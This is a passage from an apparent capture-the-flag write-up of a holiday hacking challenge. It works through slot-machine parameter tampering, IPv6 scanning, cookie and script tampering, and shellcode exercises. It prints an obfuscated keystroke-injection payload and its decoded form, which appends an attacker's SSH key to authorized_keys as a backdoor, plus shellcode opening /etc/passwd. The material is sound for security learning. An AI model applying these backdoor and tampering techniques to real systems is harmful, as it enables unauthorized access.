</code></pre><p>Change the temperature to anything over 0?.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>$ curl -XPOST -H &#39;Content-Type: application/json&#39; \
</span></span><span style=display:flex><span>  --data-binary &#39;{<span style=color:#268bd2>&#34;temperature&#34;</span>: <span style=color:#2aa198>1</span>}&#39; \
</span></span><span style=display:flex><span>  http:<span style=color:#586e75>//nidus-setup:8080/api/cooler
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;temperature&#34;</span>: <span style=color:#2aa198>1.23</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;humidity&#34;</span>: <span style=color:#2aa198>86.19</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;wind&#34;</span>: <span style=color:#2aa198>6.27</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;windchill&#34;</span>: <span style=color:#2aa198>-0.71</span>,
</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;WARNING&#34;</span>: <span style=color:#2aa198>&#34;ICE MELT DETECTED!&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>And it works! The door is open.</p><h1 id=4-slot-machine-investigation>4) Slot Machine Investigation
<a class=header-link href=#4-slot-machine-investigation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Test the security of Jack Frost's slot machines. What does the Jack Frost
Tower casino security team threaten to do when your coin total exceeds 1000?
Submit the string in the server data.response element. Talk to Noel Boetie
outside Santa's Castle for help.</p></blockquote><p>Slot machines are at <a href=https://slots.jackfrosttower.com/ target=_blank rel="noreferrer noopener">https://slots.jackfrosttower.com/</a>. Will need to proxy the
requests.</p><h2 id=noel-boetie---logic-munchers>Noel Boetie - Logic Munchers
<a class=header-link href=#noel-boetie---logic-munchers><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Let's talk to "Noel Boetie" first. He is just to the right of the castle
entrance in Castle Approach (to the left of where we are).</p><blockquote><p>I need some help, though. If you can show me how to complete a stage in
Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints
for how to find vulnerabilities.</p><p>Specifically, I'll give you some tips in finding flaws in some of the web
applications I've heard about here at the North Pole, especially those
associated with slot machines!</p></blockquote><p>Just go around and chump true statements. Trolldogs will alter statements after
going through them so watch out for those. Nothing groundbreaking here. We get
hints after completing the level 3 challenge (I did not do the rest):</p><blockquote><p>It seems they're susceptible to <a href=https://owasp.org/www-community/attacks/Web_Parameter_Tampering target=_blank rel="noreferrer noopener">parameter tampering</a>.</p><p>You can modify web request parameters with an intercepting proxy or tools
built into Firefox.</p></blockquote><h2 id=slot-machine>Slot Machine
<a class=header-link href=#slot-machine><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><a href=https://slots.jackfrosttower.com target=_blank rel="noreferrer noopener">https://slots.jackfrosttower.com</a></p><p>Spin is a POST request. We can modify the <code>cpl</code> to a negative amount and we get
extra credits when we spin and do not win.</p><pre tabindex=0><code>POST /api/v1/{{GUID}}/spin HTTP/2
Host: slots.jackfrosttower.com

betamount=0.1&amp;numline=1&amp;cpl=-10000
</code></pre><p>The response has this message which is the answer. We have to enter it in the
objectives screen:</p><p><code>"response":"I'm going to have some bouncer trolls bounce you right out of this casino!"</code></p><h1 id=5-strange-usb-device>5) Strange USB Device
<a class=header-link href=#5-strange-usb-device><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Assist the elves in reverse engineering the strange USB device. Visit Santa's
Talks Floor and hit up Jewel Loggins for advice.</p></blockquote><p>The talks floor is in the castle. Use the elevator to go to level 2. There's an
elf standing by so there's probably another challenge there but for now I am
gonna skip it because I want to do the objectives in sequence.</p><h2 id=jewel-loggins---ipv6-sandbox>Jewel Loggins - IPv6 Sandbox
<a class=header-link href=#jewel-loggins---ipv6-sandbox><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><code>PieceOnEarth</code></p><blockquote><p>So now I'm trying to do simple things like Nmap and cURL using IPv6, and I
can't quite get them working!</p><p>I think there's a <a href=https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f target=_blank rel="noreferrer noopener">Github Gist</a> that covers tool usage with IPv6
targets.</p><p>The tricky parts are knowing when to use [] around IPv6 addresses and where to
specify the source interface.</p><p>I've got a deal for you. If you show me how to solve this terminal, I'll
provide you with some nice tips about a topic I've been researching a lot
lately – Ducky Scripts! They can be really interesting and fun!</p></blockquote><p>Using the gist we can start looking for local IP addresses:</p><p><code>ping6 ff02::1 -c2</code> and <code>ping6 ff02::2 -c2</code> give us some results that we can see
with <code>ip neigh</code>:</p><p>I cannot copy text out of the terminal so hopefully this is correct.</p><pre tabindex=0><code>fe80::1 dev eth0 lladdr 02:42:c0:a8:a0:03 REACHABLE // this appears to be us?
fe80::42::c0ff:fea8:a002 dev eth0 lladdr 02:42:c0:a8:a0:02 REACHABLE
</code></pre><p>We can ping it <code>ping fe80::42::c0ff:fea8:a002 -I eth0</code> and then run <code>nmap</code>:</p><pre tabindex=0><code>nmap -6 fe80::42::c0ff:fea8:a002%eth0

// I cannot copy/paste 
Ports 80 and 9000 TCP are open.
</code></pre><p>Sometimes we cannot reach the host because the IP is now STALE and we have to
redo the <code>pin6</code> commands. If you run <code>ip neigh</code> you should see <code>STALE</code> in front
of it.</p><p>Let's look at port 80.</p><pre tabindex=0><code>curl http://[fe80::42::c0ff:fea8:a002]:80/ --interface eth0

Connect to the other open TCP port to get the striper&#39;s activation phrase!
</code></pre><p>We can use netcat to connect to port 9000.</p><pre tabindex=0><code>$ nc fe80::42::c0ff:fea8:a002%eth0 9000

PieceOnEarth
</code></pre><p>Note to self: Have to enter this in the top panel to get the achievement.</p><p>Hint from Jewel</p><blockquote><p>A troll could program a keystroke injector to deliver malicious keystrokes
when it is plugged in.</p><p>Ducky Script is a language used to specify those keystrokes.</p><p>What commands would a troll try to run on our workstations?</p><p>I heard that <a href=https://attack.mitre.org/techniques/T1098/004/ target=_blank rel="noreferrer noopener">SSH keys can be used as backdoors</a>. Maybe that's
useful?</p></blockquote><p>The link has this quote:</p><blockquote><p>Adversaries may modify SSH authorized_keys files directly with scripts or
shell commands to add their own adversary-supplied public keys. This ensures
that an adversary possessing the corresponding private key may log in as an
existing user via SSH.</p></blockquote><h2 id=morcel-nougat---strange-usb-device>Morcel Nougat - Strange USB Device
<a class=header-link href=#morcel-nougat---strange-usb-device><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><code>ickymcgoop</code></p><p>The strange USB device is in the speaker's room. Go all the way to the left on
the same floor as the previous challenge.</p><blockquote><p>Say, do you know anything about USB Rubber Duckies?</p><p>I've been playing around with them a bit myself.</p><p>Please see what you can do to help solve the Rubber Ducky Objective!</p><p>Oh, and if you need help, I hear Jewel Loggins, on this floor outside this
room, has some experience.</p></blockquote><p>We need to evaluate the USB data in <code>/mnt/USBDEVICE</code>. There is a Python script
in home named <code>mallard.py</code> which appears to contain the ducky script for
converting keystrokes to text (?).</p><p>Looking inside <a href=mallard.py>mallard.py</a> was useless, I could have just ran
<code>./mallard.py -h</code> to see the switches.</p><pre tabindex=0><code>usage: mallard.py [-h] [--file FILE] [--no_analyze] [--output_file OUTPUT_FILE]
                  [--analysis_file ANALYSIS_FILE] [--debug]

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  The file to decode, default: inject.bin
  --no_analyze, -A      Include this switch to turn off analysis of the duckyfile
  --output_file OUTPUT_FILE, -o OUTPUT_FILE
                        File to save decoded ducky script to. Default will print duckyfile to
                        screen.
  --analysis_file ANALYSIS_FILE
                        Location to output analysis. Default will print analysis to screen.
  --debug               Enable Debug Logging.
</code></pre><p>Target file is <code>/mnt/USBDEVICE/inject.bin</code>. The <code>-o</code> option does not seem to
work but we can do <code>./mallard.py -f /mnt/USBDEVICE/inject.bin</code> to see the
output.</p><p>This is there</p><pre tabindex=0><code>STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4Wd
   mxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRV
   NFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ
   0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1G
   ZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
</code></pre><p>We can run the same command minus the last part (<code>bash</code>) to see the result.</p><pre tabindex=0><code>echo &#39;ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG
   5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGl
   MRnJhdWdST2FSaWZSaXBKcUZmUHAK
   ickymcgoop@trollfun.jackfrosttower.com&#39; &gt;&gt; ~/.ssh/authorized_keys
</code></pre><p>We can see <code>ickymcgoop@trollfun.jackfrosttower.com</code>. The answer is <code>ickymcgoop</code>.</p><h1 id=6-shellcode-primer>6) Shellcode Primer
<a class=header-link href=#6-shellcode-primer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Complete the Shellcode Primer in Jack's office. According to the last
challenge, what is the secret to KringleCon success? "All of our speakers and
organizers, providing the gift of ____, free to the community." Talk to
Chimney Scissorsticks in the NetWars area for hints.</p></blockquote><p>Shellcode primer is at: <a href=https://tracer.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://tracer.kringlecastle.com/</a></p><p>Let's go find Chimney Scissorsticks. Netwars is the last button on the elevator.</p><h2 id=chimney-scissorsticks---santas-holiday-hero>Chimney Scissorsticks - Santa's Holiday Hero
<a class=header-link href=#chimney-scissorsticks---santas-holiday-hero><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><blockquote><p>It's more fun to play with a friend but I've also heard there's a clever way
to enable single player mode.</p><p>Single player mode? I heard it can be enabled by fiddling with two client-side
values, one of which is passed to the server.</p><p>It's so much more fun and easier with a friend though!</p><p>Either way, we'd really appreciate your help getting the sleigh all fueled up.</p><p>Then I can get back to thinking about shellcode...</p></blockquote><p>So we have to enable single player mode by modifying things that go from the
client.</p><p>Cookie <code>HOHOHO={"single_player":false}</code> and let's try to change it to true and
see what happens with match/replace.</p><ul><li>Match: <code>%7B%22single_player%22%3Afalse%7D</code></li><li>Replace: <code>%7B%22single_player%22%3Atrue%7D</code></li></ul><p>We can also use the browser DevTools. <code>Storage (tab) > Cookies > https://hero.kringlecastle.com</code> and set the <code>HOHOHO</code> cookie to
<code>%7B%22single_player%22%3Atrue%7D</code></p><p>But this is not enough to finish the game in single player mode.</p><p>Let's prettify and look at the file <a href=holidayhero.min.js>holidayhero.min.js</a> in
VS Code.</p><p>There's a variable <code>single_player_mode = !1,</code>. Let's set it to <code>true</code> and see
what happens.</p><p>I used the local override in Chrome/Edge and set it to true. Now, the other
place is automagically played by the game and I need to only play one side.</p><p><a href=https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide-chromium/javascript/overrides target=_blank rel="noreferrer noopener">https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide-chromium/javascript/overrides</a></p><p>Hint from Chimney</p><blockquote><p>If you run into any shellcode primers at the North Pole, be sure to read the
directions and the comments in the shellcode source!</p><p>Also, troubleshooting shellcode can be difficult. Use the debugger
step-by-step feature to watch values.</p><p>Lastly, be careful not to overwrite any register values you need to reference
later on in your shellcode.</p></blockquote><h2 id=shellcode-primer>Shellcode Primer
<a class=header-link href=#shellcode-primer><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>We can get to the primer without going to Jack's Office. It's at
<a href=https://tracer.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://tracer.kringlecastle.com/</a>.</p><p>Answer is <code>cyber security knowledge</code>.</p><h3 id=5-system-calls>5. System Calls
<a class=header-link href=#5-system-calls><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; TODO: Find the syscall number for sys_exit and put it in rax
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>60</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Put the exit_code we want (99) in rdi
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#2aa198>99</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Perform the actual syscall
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>syscall</span>
</span></span></code></pre></div><h3 id=7-getting-rip>7. Getting RIP
<a class=header-link href=#7-getting-rip><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; Remember, this call pushes the return address to the stack
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>call</span> <span style=color:#cb4b16>place_below_the_nop</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; This is where the function *thinks* it is supposed to return
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>nop</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; This is a &#39;label&#39; - as far as the call knows, this is the start of a function
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>place_below_the_nop:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Pop the top of the stack into rax
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>pop</span> <span style=color:#cb4b16>rax</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Return from our code, as in previous levels
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>ret</span>
</span></span></code></pre></div><h3 id=8-hello-world>8. Hello, World!
<a class=header-link href=#8-hello-world><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; This would be a good place for a call
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>call</span> <span style=color:#cb4b16>after_hello_world</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; This is the literal string &#39;Hello World&#39;, null terminated, as code. Except
</span></span></span><span style=display:flex><span><span style=color:#586e75>; it&#39;ll crash if it actually tries to run, so we&#39;d better jump over it!
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>db</span> &#39;<span style=color:#cb4b16>Hello</span> <span style=color:#cb4b16>World</span>&#39;,<span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; This would be a good place for a label and a pop
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>after_hello_world:
</span></span><span style=display:flex><span><span style=color:#268bd2>pop</span> <span style=color:#cb4b16>rax</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; This would be a good place for a re... oh wait, it&#39;s already here. Hooray!
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>ret</span>
</span></span></code></pre></div><h3 id=9-hello-world>9. Hello World!!
<a class=header-link href=#9-hello-world><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>The only trick here was not printing the terminating null byte in the string. So
only need to print 12 bytes and not the end.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; TODO: Get a reference to this string into the correct register
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>call</span> <span style=color:#cb4b16>hello_world</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>db</span> &#39;<span style=color:#cb4b16>Hello</span> <span style=color:#cb4b16>World</span>!&#39;,<span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hello_world:
</span></span><span style=display:flex><span><span style=color:#268bd2>pop</span> <span style=color:#cb4b16>rbx</span>  <span style=color:#586e75>; store a pointer to the string in rbx
</span></span></span><span style=display:flex><span><span style=color:#586e75>; we could have just done pop rsi
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Set up a call to sys_write
</span></span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rax to the correct syscall number for sys_write
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rdi to the first argument (the file descriptor, 1)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rsi to the second argument (buf - this is the &#34;Hello World&#34; string)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rsi</span>, <span style=color:#cb4b16>rbx</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rdx to the third argument (length of the string, in bytes)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rdx</span>, <span style=color:#2aa198>12</span> <span style=color:#586e75>; we should not print the terminating null byte here, I got an error when I did it
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Perform the syscall
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Return cleanly
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>ret</span>
</span></span></code></pre></div><h3 id=10-opening-a-file>10. Opening a File
<a class=header-link href=#10-opening-a-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Nothing new here, just a different syscall that opens a file.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#586e75>; TODO: Get a reference to this string into the correct register
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>call</span> <span style=color:#cb4b16>passwd</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>db</span> &#39;/<span style=color:#cb4b16>etc</span>/<span style=color:#cb4b16>passwd</span>&#39;,<span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>passwd:
</span></span><span style=display:flex><span><span style=color:#268bd2>pop</span> <span style=color:#cb4b16>rbx</span>  <span style=color:#586e75>; store a pointer to the string in rbx
</span></span></span><span style=display:flex><span><span style=color:#586e75>; could have done `pop rdi`
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Set up a call to sys_open
</span></span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rax to the correct syscall number
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rax</span>, <span style=color:#2aa198>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rdi to the first argument (the filename)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rdi</span>, <span style=color:#cb4b16>rbx</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rsi to the second argument (flags - 0 is fine)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rsi</span> , <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; TODO: Set rdx to the third argument (mode - 0 is also fine)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>mov</span> <span style=color:#cb4b16>rdx</span>, <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; Perform the syscall
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75>; syscall sets rax to the file handle, so to return the file handle we don&#39;t
</span></span></span><span style=display:flex><span><span style=color:#586e75>; need to do anything else!
</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#268bd2>ret</span>
</span></span></code></pre></div><h3 id=11-reading-a-file>11. Reading a File
